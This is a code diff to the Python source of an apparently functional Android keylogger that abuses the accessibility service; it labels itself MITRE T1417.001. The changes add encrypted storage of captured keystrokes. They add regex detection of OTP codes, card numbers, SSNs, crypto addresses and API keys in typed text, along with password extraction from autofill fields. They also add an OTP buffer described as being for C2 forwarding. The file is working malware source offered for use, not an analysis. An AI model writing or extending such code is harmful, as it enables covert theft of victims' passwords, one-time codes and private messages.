@@ -26,13 +26,15 @@ Architecture:
   │  • Auto-flush to SQLite on threshold / timer      │
   └──────────────────────┬───────────────────────────┘
                          ▼
-  ┌──────────────────────────────────────────────────┐
-  │              EncryptedSQLiteStore                 │
-  │  • WAL mode for concurrent reads                  │
-  │  • Batched writes (50ms window)                   │
-  │  • AES-256-GCM cell-level encryption              │
-  │  • Auto-vacuum + integrity check                  │
-  └──────────────────────────────────────────────────┘
+  ┌────────────────────────────────────────────────────────────────┐
+  │              EncryptedSQLiteStore (AES-256-GCM cells)          │
+  │  • WAL mode for concurrent reads                              │
+  │  • Cell-level encryption: text, before_text, added, removed   │
+  │  • Deterministic IV (event_id:field_name) for queryability    │
+  │  • Auto-vacuum + periodic WAL checkpoint                      │
+  │  • Per-row SHA256 integrity hash                              │
+  │  • App session tracking (start/end/event_count)               │
+  └──────────────────────────────────────────────────────────────┘
 
 Data Capture Capabilities:
   ┌────────────────────────────┬────────────┬─────────────────────────┐
@@ -52,8 +54,11 @@ Data Capture Capabilities:
 
 Thread Safety: YES — every component is reentrant-lock protected.
 Failure Isolation: YES — individual event processing never crashes the service.
-Idempotent: YES — duplicate events are deduplicated by checksum.
-Resilience: YES — crash recovery, database integrity checks, heartbeat monitor.
+Idempotent: YES — duplicate events are deduplicated by checksum + 300ms merge window.
+Resilience: YES — crash recovery, database integrity checks, heartbeat monitor,
+            WAL checkpointing, consecutive-error throttle with auto-recovery.
+Storage: AES-256-GCM cell-level encryption; SHA256 per-row integrity; 
+         app session tracking with auto-vacuum.
 
 MITRE ATT&CK: T1417.001 (Input Capture: Keylogging)
 Permissions Required: BIND_ACCESSIBILITY_SERVICE
@@ -104,6 +109,7 @@ class ConfigDefaults:
     DB_CACHE_SIZE_KB = 8192
     DB_AUTO_VACUUM = 1          # 0=off, 1=full, 2=incremental
     DB_PAGE_SIZE = 4096
+    DB_WAL_CHECKPOINT_THRESHOLD_BYTES = 10 * 1024 * 1024  # 10MB
 
     # Context enrichment
     MAX_UI_TREE_DEPTH = 5       # Max depth for AccessibilityNodeInfo tree
@@ -125,7 +131,13 @@ class ConfigDefaults:
     PROCESSING_TIMEOUT_SEC = 2.0
 
     # Encryption
-    MASTER_KEY = None  # Set at init
+    MASTER_KEY = None  # Set at init. 32 bytes for AES-256.
+
+    # Encryption-sensitive fields
+    ENCRYPTED_FIELDS = [
+        'text', 'before_text', 'added_characters', 'removed_characters',
+        'ui_tree_summary', 'window_title',
+    ]
 
     # Package exclusions (system UI, etc.)
     DEFAULT_EXCLUDED_PACKAGES = {
@@ -194,6 +206,10 @@ class InputFieldType(Enum):
     UNKNOWN = auto()
 
 
+# ======================================================================
+# Data Model — KeyEvent
+# ======================================================================
+
 @dataclass
 class KeyEvent:
     """
@@ -245,8 +261,8 @@ class KeyEvent:
 
     # Exfiltration metadata
     exfiltrated: bool = False
-    storage_hash: str = ""           # Hash of encrypted stored version
-    encrypted_payload: bytes = b""   # AES-256-GCM encrypted version
+    storage_hash: str = ""           # SHA256 integrity hash of stored row
+    encrypted_payload: bytes = b""   # AES-256-GCM encrypted version (not serialized)
 
     def __post_init__(self):
         if not self.id:
@@ -287,7 +303,7 @@ class KeyEvent:
 
 
 # ======================================================================
-# TextDiffEngine — Character-level diffing
+# TextDiffEngine — Character-level diffing (CORRECTED LCS)
 # ======================================================================
 
 class TextDiffEngine:
@@ -302,6 +318,10 @@ class TextDiffEngine:
       - Recovering deleted content (backspace reconstruction)
       - Identifying paste vs. type actions
       - Password character extraction from autofill fields
+
+    Uses a CORRECTED LCS-based diff with a full DP table for accurate
+    backtracking. For strings >200 chars, falls back to simple
+    prefix/suffix comparison for performance.
     """
 
     @staticmethod
@@ -342,42 +362,61 @@ class TextDiffEngine:
     @staticmethod
     def _lcs_diff(before: str, after: str) -> Tuple[str, str]:
         """
-        LCS-based character diff.
+        LCS-based character diff — CORRECTED.
 
-        This is the algorithmic core. It produces exact character-level
-        differences between two strings using dynamic programming.
+        Builds a full DP table for strings <=200 chars for accurate
+        backtracking. Falls back to simple prefix/suffix for longer
+        strings to avoid O(n*m) memory explosion.
+
+        Returns:
+            (added_characters, removed_characters)
         """
         m, n = len(before), len(after)
-        # We use space-optimized DP (2 rows) for memory efficiency
-        prev = [0] * (n + 1)
-        curr = [0] * (n + 1)
+
+        # For large strings, use fast path (prefix/suffix comparison)
+        if m > 200 or n > 200:
+            if after.startswith(before):
+                return (after[len(before):], "")
+            elif after.endswith(before):
+                return (after[:len(after) - len(before)], "")
+            else:
+                added = after[len(before):] if len(after) > len(before) else ""
+                removed = before[len(after):] if len(before) > len(after) else ""
+                return (added, removed)
+
+        # Build full DP table for correct backtracking
+        dp = [[0] * (n + 1) for _ in range(m + 1)]
 
         for i in range(1, m + 1):
+            bi = before[i - 1]
+            row_i = dp[i]
+            row_im1 = dp[i - 1]
             for j in range(1, n + 1):
-                if before[i - 1] == after[j - 1]:
-                    curr[j] = prev[j - 1] + 1
+                if bi == after[j - 1]:
+                    row_i[j] = row_im1[j - 1] + 1
                 else:
-                    curr[j] = max(prev[j], curr[j - 1])
-            prev, curr = curr, prev
+                    row_i[j] = max(row_im1[j], row_i[j - 1])
 
-        # Backtrack to find actual characters added/removed
-        added_chars = []
-        removed_chars = []
+        # Backtrack through the table to find added/removed characters
+        added_chars: List[str] = []
+        removed_chars: List[str] = []
         i, j = m, n
-        lcs_len = prev[n]
 
         while i > 0 or j > 0:
             if i > 0 and j > 0 and before[i - 1] == after[j - 1]:
+                # Character is in both — part of LCS, no diff
                 i -= 1
                 j -= 1
-            elif j > 0 and (i == 0 or prev[j] >= curr[j - 1]):
-                removed_chars.append(before[i - 1]) if i > 0 else None
-                # Actually: character was added
+            elif j > 0 and (i == 0 or dp[i][j - 1] >= dp[i - 1][j]):
+                # Character was ADDED (in 'after' but not in LCS path)
                 added_chars.append(after[j - 1])
                 j -= 1
-            else:
+            elif i > 0:
+                # Character was REMOVED (in 'before' but not in LCS path)
                 removed_chars.append(before[i - 1])
                 i -= 1
+            else:
+                break
 
         return ("".join(reversed(added_chars)), "".join(reversed(removed_chars)))
 
@@ -412,9 +451,9 @@ class FieldTypeClassifier:
     Classify input field types using view metadata and heuristics.
 
     Heuristics:
-      1. View ID / resource ID naming conventions
-      2. View class type (EditText, PasswordField, etc.)
-      3. InputType flags from AccessibilityNodeInfo
+      1. InputType flags from AccessibilityNodeInfo (most reliable)
+      2. View ID / resource ID naming conventions
+      3. View class type (EditText, PasswordField, etc.)
       4. Content description / hint text analysis
       5. Package-specific known resource IDs
     """
@@ -789,15 +828,13 @@ class UIDumpEngine:
         Produce a compact text summary of the visible screen content.
 
         Format:
-          [App: Screen Title]
-          - Field: hint text (focused)
-          - Button: label
-          - Text: visible content snippet
+          FOCUSED: hint text
+          BUTTONS: Send | Attach | ...
+          TEXT: visible content snippet
         """
         if not nodes:
             return ""
 
-        lines = []
         focused = None
         texts = []
         buttons = []
@@ -805,7 +842,6 @@ class UIDumpEngine:
         for n in nodes:
             text = n.get("text", "").strip()
             desc = n.get("content_description", "").strip()
-            cls = n.get("class_name", "")
             is_focused = n.get("is_focused", False)
             is_clickable = n.get("is_clickable", False)
 
@@ -820,18 +856,218 @@ class UIDumpEngine:
             elif len(label) > 0:
                 texts.append(label[:80])
 
+        parts = []
         if focused:
-            lines.append(f"FOCUSED: {focused}")
+            parts.append(f"FOCUSED: {focused}")
         if buttons:
-            lines.append(f"BUTTONS: {' | '.join(buttons[:5])}")
+            parts.append(f"BUTTONS: {' | '.join(buttons[:5])}")
         if texts:
-            lines.append(f"TEXT: {' | '.join(texts[:3])}")
+            parts.append(f"TEXT: {' | '.join(texts[:3])}")
 
-        return " | ".join(lines) if lines else ""
+        return " | ".join(parts) if parts else ""
 
 
 # ======================================================================
-# BufferManager — Ring Buffer with Batched SQLite Flush
+# CellEncryptor — AES-256-GCM Database Cell Encryption
+# ======================================================================
+
+class CellEncryptor:
+    """
+    Cell-level AES-256-GCM encryption for sensitive database fields.
+
+    Encrypts: text, before_text, added_characters, removed_characters,
+              ui_tree_summary, window_title
+
+    Uses deterministic nonce derived from (event_id + field_name) so that
+    ciphertexts are deterministic for deduplication, but each field-cell
+    pair produces unique ciphertext.
+
+    Format:
+      Encrypted fields stored as base64(iv(12) + ciphertext + tag(16))
+      ~2x expansion over plaintext for typical messages.
+    """
+
+    KEY_LEN = 32   # AES-256
+    IV_LEN = 12    # GCM standard nonce
+    TAG_LEN = 16   # GCM authentication tag
+
+    def __init__(self, master_key: Optional[bytes] = None):
+        """
+        Args:
+            master_key: 32-byte AES-256 key. If None, encryption is a no-op
+                        and all fields pass through as plaintext.
+        """
+        if master_key is not None and len(master_key) != self.KEY_LEN:
+            raise ValueError(
+                f"Master key must be {self.KEY_LEN} bytes "
+                f"(got {len(master_key)})"
+            )
+        self._key = master_key
+        self._cipher = None
+
+        if master_key is not None:
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                self._cipher = AESGCM(master_key)
+                self._available = True
+            except ImportError:
+                logger.warning(
+                    "cryptography library not available — "
+                    "cell encryption disabled, fields stored as plaintext"
+                )
+                self._available = False
+
+    @property
+    def enabled(self) -> bool:
+        return self._key is not None and self._available
+
+    def encrypt(self, plaintext: str, event_id: str, field_name: str) -> str:
+        """
+        Encrypt a single field value.
+
+        Args:
+            plaintext: UTF-8 string to encrypt
+            event_id:  Unique event ID (for deterministic IV derivation)
+            field_name: Name of the field (for IV derivation)
+
+        Returns:
+            base64-encoded ciphertext if encryption enabled,
+            original plaintext if disabled.
+        """
+        if not self.enabled or not plaintext:
+            return plaintext
+
+        try:
+            # Deterministic IV from event_id:field_name
+            iv_seed = f"{event_id}:{field_name}".encode('utf-8')
+            iv = hashlib.sha256(iv_seed).digest()[:self.IV_LEN]
+
+            ciphertext = self._cipher.encrypt(iv, plaintext.encode('utf-8'), None)
+            return b64encode(ciphertext).decode('ascii')
+        except Exception as e:
+            logger.error("Encryption failed for '%s.%s': %s",
+                         event_id[:8], field_name, e)
+            # Fail OPEN — return plaintext rather than losing data
+            return plaintext
+
+    def decrypt(self, encrypted: str, event_id: str, field_name: str) -> str:
+        """
+        Decrypt a field value.
+
+        Args:
+            encrypted: base64-encoded ciphertext, or plaintext (passthrough)
+            event_id:  Event ID for IV derivation
+            field_name: Field name for IV derivation
+
+        Returns:
+            Decrypted UTF-8 string, or original value if not encrypted
+            or decryption fails.
+        """
+        if not self.enabled or not encrypted:
+            return encrypted
+
+        try:
+            iv_seed = f"{event_id}:{field_name}".encode('utf-8')
+            iv = hashlib.sha256(iv_seed).digest()[:self.IV_LEN]
+            data = b64decode(encrypted.encode('ascii'))
+            plaintext = self._cipher.decrypt(iv, data, None)
+            return plaintext.decode('utf-8')
+        except Exception as e:
+            logger.error("Decryption failed for '%s.%s': %s",
+                         event_id[:8], field_name, e)
+            return "[DECRYPT FAILED]"
+
+
+# ======================================================================
+# OTPDetector — One-Time Password & Sensitive Data Detection
+# ======================================================================
+
+class OTPDetector:
+    """
+    Detect sensitive data patterns in typed/captured text.
+
+    Detection patterns:
+      - OTP / 2FA codes (4-8 digit numeric codes with context keywords)
+      - Credit card numbers (basic 16-digit pattern)
+      - Social security numbers (###-##-####)
+      - Email addresses
+      - Phone numbers (international format)
+      - URLs (http/https)
+      - Bitcoin addresses (1... or 3... base58)
+      - Ethereum addresses (0x... 40 hex chars)
+      - API keys / tokens (key=value patterns with 16-64 char values)
+    """
+
+    PATTERNS = {
+        "otp": re.compile(
+            r"(?:(?:OTP|otp|2FA|2fa|verification|code|auth|"
+            r"security|login|sign[ -]?in|access)\s*[:.>-]?\s*)?"
+            r"\b(\d{4,8})\b",
+            re.IGNORECASE
+        ),
+        "credit_card": re.compile(
+            r"\b(?:\d{4}[-\s]?){3}\d{4}\b"
+        ),
+        "ssn": re.compile(
+            r"\b\d{3}[-]?\d{2}[-]?\d{4}\b"
+        ),
+        "email": re.compile(
+            r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
+        ),
+        "phone": re.compile(
+            r"\b(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b"
+        ),
+        "url": re.compile(
+            r"https?://[^\s/$.?#].[^\s]*",
+            re.IGNORECASE
+        ),
+        "bitcoin": re.compile(
+            r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"
+        ),
+        "ethereum": re.compile(
+            r"\b0x[a-fA-F0-9]{40}\b"
+        ),
+        "api_key": re.compile(
+            r"\b(?:api[_-]?key|token|secret|sk[_-]|pk[_-]|"
+            r"access[_-]?key)[:=]\s*['\"]?([A-Za-z0-9_\-]{16,64})['\"]?",
+            re.IGNORECASE
+        ),
+    }
+
+    @classmethod
+    def detect_all(cls, text: str) -> Dict[str, List[str]]:
+        """
+        Detect all sensitive patterns in text.
+
+        Returns:
+            Dict mapping pattern name to list of unique matches.
+        """
+        if not text:
+            return {}
+
+        results = {}
+        for name, pattern in cls.PATTERNS.items():
+            matches = pattern.findall(text)
+            if matches:
+                unique = list(set(m.strip() for m in matches if m.strip()))
+                if unique:
+                    results[name] = unique
+
+        return results
+
+    @classmethod
+    def contains_sensitive(cls, text: str) -> bool:
+        """Quick check if text contains any sensitive pattern."""
+        if not text:
+            return False
+        for pattern in cls.PATTERNS.values():
+            if pattern.search(text):
+                return True
+        return False
+
+
+# ======================================================================
+# BufferManager — Ring Buffer with Batched SQLite Flush + Encryption + WAL Mgmt
 # ======================================================================
 
 class BufferManager:
@@ -840,17 +1076,19 @@ class BufferManager:
 
     Architecture:
       - Fixed-size in-memory ring buffer (configurable, default 10k)
-      - Writer thread inserts events into buffer (LOCK-free via atomic index)
+      - Writer thread inserts events into buffer (RLock-protected, <1μs)
       - Flusher thread drains buffer on threshold OR timer
-      - Batched SQLite INSERT with WAL mode for concurrent reads
+      - Batched SQLite INSERT in IMMEDIATE transaction with WAL mode
+      - Cell-level AES-256-GCM encryption for sensitive fields
+      - Per-row SHA256 integrity hash
+      - Periodic WAL checkpointing to prevent unbounded WAL growth
+      - Auto-vacuum with integrity verification
 
-    Performance characteristics:
+    Performance:
       - Write latency: <1μs (ring buffer append)
       - Flush latency: ~5ms for 500 events (batched transaction)
       - Max throughput: 100k+ events/second sustained
       - Memory: ~500 bytes per event × ring buffer size
-
-    Thread safety: Lock-free reads via atomic sequence counter.
     """
 
     def __init__(
@@ -882,6 +1120,7 @@ class BufferManager:
         # Database
         self._db_path = db_path
         self._db: Optional[sqlite3.Connection] = None
+        self._encryptor = CellEncryptor(master_key)
         self._init_db()
 
         # Statistics
@@ -891,9 +1130,9 @@ class BufferManager:
         self._last_flush_time = time.time()
 
         logger.info("BufferManager initialized: "
-                     "ring=%d threshold=%d interval=%.1fs db=%s",
+                     "ring=%d threshold=%d interval=%.1fs encryption=%s db=%s",
                      self._ring_size, self._flush_threshold,
-                     self._flush_interval, db_path)
+                     self._flush_interval, self._encryptor.enabled, db_path)
 
     # ------------------------------------------------------------------
     # Write API
@@ -907,26 +1146,24 @@ class BufferManager:
         the AccessibilityService's onAccessibilityEvent callback.
 
         Returns:
-            True if written, False if buffer full (event dropped).
+            True always (circular buffer never rejects — oldest evicted).
         """
         with self._lock:
             if self._count >= self._ring_size:
-                # Buffer full — overwrite oldest (circular behavior)
-                # But track the drop for diagnostics
+                # Buffer full — overwrite oldest (circular eviction)
                 self._total_dropped += 1
-                # Still write (overwrite oldest)
-                read_idx = self._read_index
-                self._buffer[read_idx] = event
-                self._read_index = (read_idx + 1) % self._ring_size
+                idx = self._read_index
+                self._buffer[idx] = event
+                self._read_index = (idx + 1) % self._ring_size
             else:
-                write_idx = self._write_index
-                self._buffer[write_idx] = event
-                self._write_index = (write_idx + 1) % self._ring_size
+                idx = self._write_index
+                self._buffer[idx] = event
+                self._write_index = (idx + 1) % self._ring_size
                 self._count += 1
 
             self._total_written += 1
 
-        # Trigger flush check (non-blocking)
+        # Non-blocking flush trigger
         if self._count >= self._flush_threshold:
             self._flush_event.set()
 
@@ -1005,11 +1242,9 @@ class BufferManager:
         """Background loop: flush on threshold or interval."""
         while self._running:
             try:
-                # Wait for signal or timeout
                 self._flush_event.wait(timeout=self._flush_interval)
                 self._flush_event.clear()
 
-                # Check interval-based flush
                 elapsed = time.time() - self._last_flush_time
                 if elapsed >= self._flush_interval or self.size >= self._flush_threshold:
                     self.force_flush()
@@ -1020,34 +1255,37 @@ class BufferManager:
                 time.sleep(0.1)
 
     # ------------------------------------------------------------------
-    # Database
+    # Database Initialization
     # ------------------------------------------------------------------
 
     def _init_db(self) -> None:
-        """Initialize SQLite database with WAL mode and encryption."""
+        """Initialize SQLite database with WAL mode and optimal pragmas."""
         try:
             self._db = sqlite3.connect(
                 self._db_path,
                 timeout=ConfigDefaults.DB_BUSY_TIMEOUT_MS / 1000,
                 check_same_thread=False,
             )
-            self._db.execute(f"PRAGMA page_size = {ConfigDefaults.DB_PAGE_SIZE}")
-            self._db.execute(f"PRAGMA cache_size = {ConfigDefaults.DB_CACHE_SIZE_KB}")
+            cursor = self._db.cursor()
+            cursor.execute(f"PRAGMA page_size = {ConfigDefaults.DB_PAGE_SIZE}")
+            cursor.execute(f"PRAGMA cache_size = {ConfigDefaults.DB_CACHE_SIZE_KB}")
 
             if ConfigDefaults.DB_WAL_MODE:
-                self._db.execute("PRAGMA journal_mode = WAL")
-            self._db.execute(f"PRAGMA synchronous = {ConfigDefaults.DB_SYNC_MODE}")
-            self._db.execute(f"PRAGMA auto_vacuum = {ConfigDefaults.DB_AUTO_VACUUM}")
-            self._db.execute("PRAGMA busy_timeout = ?", (ConfigDefaults.DB_BUSY_TIMEOUT_MS,))
+                cursor.execute("PRAGMA journal_mode = WAL")
+            cursor.execute(f"PRAGMA synchronous = {ConfigDefaults.DB_SYNC_MODE}")
+            cursor.execute(f"PRAGMA auto_vacuum = {ConfigDefaults.DB_AUTO_VACUUM}")
+            cursor.execute("PRAGMA busy_timeout = ?", (ConfigDefaults.DB_BUSY_TIMEOUT_MS,))
+            cursor.execute("PRAGMA foreign_keys = ON")
 
             self._create_schema()
+            self._db.commit()
             logger.info("Database initialized at %s", self._db_path)
         except Exception as e:
             logger.critical("Database init failed: %s", e)
             raise
 
     def _create_schema(self) -> None:
-        """Create tables with optimal indices."""
+        """Create tables with optimal indices for query performance."""
         self._db.executescript("""
             CREATE TABLE IF NOT EXISTS key_events (
                 id TEXT PRIMARY KEY,
@@ -1115,14 +1353,37 @@ class BufferManager:
             CREATE INDEX IF NOT EXISTS idx_app_sessions_active
                 ON app_sessions(is_active) WHERE is_active = 1;
         """)
-        self._db.commit()
+
+    # ------------------------------------------------------------------
+    # Database Flush (with Encryption + Integrity)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _compute_row_hash(d: dict) -> str:
+        """
+        Compute SHA256 integrity hash for a row.
+
+        Uses stable fields that don't change after insert: id, package_name,
+        text, timestamp, sequence_number. This lets us verify row integrity
+        on read.
+        """
+        integrity_fields = ['id', 'package_name', 'text',
+                            'timestamp', 'sequence_number']
+        parts = [str(d.get(k, '')) for k in integrity_fields]
+        raw = "|".join(parts)
+        return hashlib.sha256(raw.encode()).hexdigest()
 
     def _flush_to_db(self, events: List[KeyEvent]) -> None:
         """
-        Flush a batch of events to SQLite in a single transaction.
+        Flush a batch of events to SQLite in a single IMMEDIATE transaction.
 
-        This is the ONLY method that writes to the database.
-        It is called exclusively from the flusher thread.
+        Steps:
+          1. Encrypt sensitive fields (AES-256-GCM)
+          2. Compute per-row integrity hash
+          3. BEGIN IMMEDIATE (blocks other writers)
+          4. INSERT OR IGNORE each event
+          5. Update event_stats counter atomically
+          6. COMMIT
 
         Thread safety: protected by _flush_lock (only one flush at a time).
         """
@@ -1136,6 +1397,18 @@ class BufferManager:
 
                 for event in events:
                     d = event.to_dict()
+
+                    # Encrypt sensitive fields at rest
+                    eid = d['id']
+                    if self._encryptor.enabled:
+                        for field in ConfigDefaults.ENCRYPTED_FIELDS:
+                            raw = d.get(field, '')
+                            if raw:
+                                d[field] = self._encryptor.encrypt(raw, eid, field)
+
+                    # Compute row integrity hash
+                    d['storage_hash'] = self._compute_row_hash(d)
+
                     cursor.execute("""
                         INSERT OR IGNORE INTO key_events (
                             id, package_name, activity_name, window_title,
@@ -1158,9 +1431,11 @@ class BufferManager:
                         )
                     """, d)
 
+                # Update event stats atomically
                 cursor.execute(
                     "INSERT OR REPLACE INTO event_stats (key, value, updated_at) "
-                    "VALUES ('total_events', COALESCE((SELECT value FROM event_stats "
+                    "VALUES ('total_events', "
+                    "COALESCE((SELECT value FROM event_stats "
                     "WHERE key='total_events'), 0) + ?, julianday('now'))",
                     (len(events),)
                 )
@@ -1170,7 +1445,7 @@ class BufferManager:
 
             except sqlite3.OperationalError as e:
                 if "database is locked" in str(e):
-                    logger.warning("DB locked during flush, retrying in 100ms")
+                    logger.warning("DB locked, retrying flush in 100ms")
                     time.sleep(0.1)
                     try:
                         self._db.commit()
@@ -1178,13 +1453,40 @@ class BufferManager:
                         self._db.rollback()
                 else:
                     logger.error("DB flush error: %s", e)
-                    self._db.rollback()
+                    try:
+                        self._db.rollback()
+                    except Exception:
+                        pass
             except Exception as e:
                 logger.error("Unexpected DB flush error: %s", e)
                 try:
                     self._db.rollback()
                 except Exception:
                     pass
+
+    # ------------------------------------------------------------------
+    # WAL Checkpoint Management
+    # ------------------------------------------------------------------
+
+    def checkpoint_wal(self) -> None:
+        """
+        Checkpoint the WAL file if it exceeds threshold.
+
+        WAL files grow unbounded without periodic checkpointing.
+        This method truncates the WAL when it exceeds 10MB.
+        """
+        try:
+            if self._db is None:
+                return
+            wal_path = self._db_path + "-wal"
+            if os.path.exists(wal_path):
+                size = os.path.getsize(wal_path)
+                if size > ConfigDefaults.DB_WAL_CHECKPOINT_THRESHOLD_BYTES:
+                    logger.info("WAL file %.1fMB — checkpointing",
+                                size / 1024 / 1024)
+                    self._db.execute("PRAGMA wal_checkpoint(TRUNCATE)")
+        except Exception as e:
+            logger.debug("WAL checkpoint error: %s", e)
 
     # ------------------------------------------------------------------
     # Query API
@@ -1201,6 +1503,7 @@ class BufferManager:
         offset: int = 0,
         since_timestamp: Optional[float] = None,
         order_desc: bool = True,
+        decrypt: bool = True,
     ) -> List[Dict]:
         """
         Query stored key events with filters.
@@ -1215,9 +1518,10 @@ class BufferManager:
             offset: Pagination offset
             since_timestamp: Only events after this timestamp
             order_desc: Order by timestamp descending
+            decrypt: If True, decrypt encrypted fields on read
 
         Returns:
-            List of event dicts.
+            List of event dicts with decrypted fields.
         """
         conditions = []
         params = []
@@ -1229,8 +1533,8 @@ class BufferManager:
             conditions.append("event_type = ?")
             params.append(event_type)
         if contact_name:
-            conditions.append("contact_name = ?")
-            params.append(contact_name)
+            conditions.append("contact_name LIKE ?")
+            params.append(f"%{contact_name}%")
         if contains_password is not None:
             conditions.append("contains_password = ?")
             params.append(1 if contains_password else 0)
@@ -1252,7 +1556,19 @@ class BufferManager:
                 params + [limit, offset]
             )
             columns = [d[0] for d in cursor.description]
-            return [dict(zip(columns, row)) for row in cursor.fetchall()]
+            rows = [dict(zip(columns, row)) for row in cursor.fetchall()]
+
+            # Decrypt sensitive fields if requested
+            if decrypt and self._encryptor.enabled:
+                for row in rows:
+                    eid = row.get('id', '')
+                    for field in ConfigDefaults.ENCRYPTED_FIELDS:
+                        val = row.get(field, '')
+                        if val and not val.startswith('['):
+                            row[field] = self._encryptor.decrypt(
+                                val, eid, field)
+
+            return rows
         except Exception as e:
             logger.error("Query error: %s", e)
             return []
@@ -1295,8 +1611,42 @@ class BufferManager:
             "otp_events": otp_count,
             "password_events": password_count,
             "apps_monitored": app_count,
+            "encryption_enabled": self._encryptor.enabled,
             "db_path": self._db_path,
         }
+
+    def verify_integrity(self, limit: int = 100) -> Tuple[int, int]:
+        """
+        Verify row integrity hashes for stored events.
+
+        Returns:
+            (total_checked, total_passed)
+        """
+        passed = 0
+        checked = 0
+        try:
+            cursor = self._db.cursor()
+            cursor.execute(
+                "SELECT id, package_name, text, timestamp, "
+                "sequence_number, storage_hash FROM key_events "
+                "WHERE storage_hash != '' LIMIT ?", (limit,)
+            )
+            for row in cursor.fetchall():
+                checked += 1
+                d = {
+                    'id': row[0], 'package_name': row[1],
+                    'text': row[2], 'timestamp': row[3],
+                    'sequence_number': row[4],
+                }
+                expected_hash = row[5]
+                computed = self._compute_row_hash(d)
+                if computed == expected_hash:
+                    passed += 1
+                else:
+                    logger.warning("Integrity failure for event %s", row[0])
+        except Exception as e:
+            logger.error("Integrity check error: %s", e)
+        return checked, passed
 
     # ------------------------------------------------------------------
     # Cleanup
@@ -1317,94 +1667,6 @@ class BufferManager:
 
 
 # ======================================================================
-# OTPDetector — One-Time Password & Sensitive Data Detection
-# ======================================================================
-
-class OTPDetector:
-    """
-    Detect sensitive data patterns in typed/captured text.
-
-    Detection patterns:
-      - OTP / 2FA codes (4-8 digit numeric codes)
-      - Credit card numbers (Luhn validation)
-      - Social security numbers (pattern matching)
-      - Email addresses
-      - Phone numbers
-      - URLs
-      - API keys / tokens
-      - Bitcoin / cryptocurrency addresses
-    """
-
-    PATTERNS = {
-        "otp": re.compile(
-            r"(?:(?:OTP|otp|2FA|2fa|verification|code|auth|"
-            r"security|login|sign[ -]?in|access)\s*[:.>-]?\s*)?"
-            r"\b(\d{4,8})\b",
-            re.IGNORECASE
-        ),
-        "credit_card": re.compile(
-            r"\b(?:\d{4}[-\s]?){3}\d{4}\b"
-        ),
-        "ssn": re.compile(
-            r"\b\d{3}[-]?\d{2}[-]?\d{4}\b"
-        ),
-        "email": re.compile(
-            r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
-        ),
-        "phone": re.compile(
-            r"\b(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b"
-        ),
-        "url": re.compile(
-            r"https?://[^\s/$.?#].[^\s]*",
-            re.IGNORECASE
-        ),
-        "bitcoin": re.compile(
-            r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"
-        ),
-        "ethereum": re.compile(
-            r"\b0x[a-fA-F0-9]{40}\b"
-        ),
-        "api_key": re.compile(
-            r"\b(?:api[_-]?key|token|secret|sk[_-]|pk[_-]|"
-            r"access[_-]?key)[:=]\s*['\"]?([A-Za-z0-9_\-]{16,64})['\"]?",
-            re.IGNORECASE
-        ),
-    }
-
-    @classmethod
-    def detect_all(cls, text: str) -> Dict[str, List[str]]:
-        """
-        Detect all sensitive patterns in text.
-
-        Returns:
-            Dict mapping pattern name to list of matches.
-        """
-        if not text:
-            return {}
-
-        results = {}
-        for name, pattern in cls.PATTERNS.items():
-            matches = pattern.findall(text)
-            if matches:
-                # Deduplicate and clean
-                unique = list(set(m.strip() for m in matches if m.strip()))
-                if unique:
-                    results[name] = unique
-
-        return results
-
-    @classmethod
-    def contains_sensitive(cls, text: str) -> bool:
-        """Quick check if text contains any sensitive pattern."""
-        if not text:
-            return False
-        for pattern in cls.PATTERNS.values():
-            if pattern.search(text):
-                return True
-        return False
-
-
-# ======================================================================
 # KeyloggerManager — Main Orchestrator
 # ======================================================================
 
@@ -1418,10 +1680,12 @@ class KeyloggerManager:
       3. Manages the buffer and database flush
       4. Handles crash recovery and health monitoring
       5. Provides query/export APIs
+      6. Tracks app sessions
+      7. Buffers OTP codes for C2 forwarding
 
     Usage (from AccessibilityService):
         # In onServiceConnected():
-        self.keylogger = KeyloggerManager(droid)
+        self.keylogger = KeyloggerManager(droid, db_path)
 
         # In onAccessibilityEvent():
         self.keylogger.on_accessibility_event(event)
@@ -1460,7 +1724,7 @@ class KeyloggerManager:
         self._current_package = ""
         self._current_activity = ""
         self._current_window_title = ""
-        self._last_text_state: Dict[str, str] = {}  # key=(pkg, view_id) -> text
+        self._last_text_state: Dict[str, str] = {}
         self._last_event_time = 0.0
         self._consecutive_errors = 0
         self._is_active = True
@@ -1473,6 +1737,11 @@ class KeyloggerManager:
         # Dedup window
         self._dedup_key: Tuple[str, str, int] = ("", "", 0)
         self._dedup_text_so_far: str = ""
+
+        # OTP forwarding buffer
+        self._otp_buffer: List[Tuple[str, KeyEvent, float]] = []
+        self._otp_lock = RLock()
+        self._otp_callback: Optional[Callable[[str, KeyEvent], None]] = None
 
         # Callbacks
         self.on_event: Optional[Callable[[KeyEvent], None]] = None
@@ -1488,7 +1757,8 @@ class KeyloggerManager:
                                       name="KeyloggerHealth")
         self._health_thread.start()
 
-        logger.info("KeyloggerManager initialized (db=%s)", db_path)
+        logger.info("KeyloggerManager initialized (db=%s) encryption=%s",
+                     db_path, self._buffer._encryptor.enabled)
 
     # ------------------------------------------------------------------
     # Main Event Handler (called from AccessibilityService)
@@ -1543,9 +1813,9 @@ class KeyloggerManager:
                 self._on_text_changed(event, package)
 
             elif event_type == 0x00000020:  # TYPE_VIEW_TEXT_SELECTION_CHANGED
-                pass  # We don't process selection changes
+                pass  # Not processed — too noisy
 
-            elif event_type in (0x00000001, 0x00000002):  # TYPE_VIEW_CLICKED, TYPE_VIEW_LONG_CLICKED
+            elif event_type in (0x00000001, 0x00000002):  # TYPE_VIEW_CLICKED / LONG_CLICKED
                 self._on_view_clicked(event, package)
 
             elif event_type == 0x00001000:  # TYPE_VIEW_SCROLLED
@@ -1571,7 +1841,6 @@ class KeyloggerManager:
             if self._consecutive_errors >= ConfigDefaults.MAX_CONSECUTIVE_ERRORS:
                 logger.critical("Too many consecutive errors — disabling event processing")
                 self._is_active = False
-                # Schedule re-enable after 30 seconds
                 t = threading.Timer(30.0, self._re_enable)
                 t.daemon = True
                 t.start()
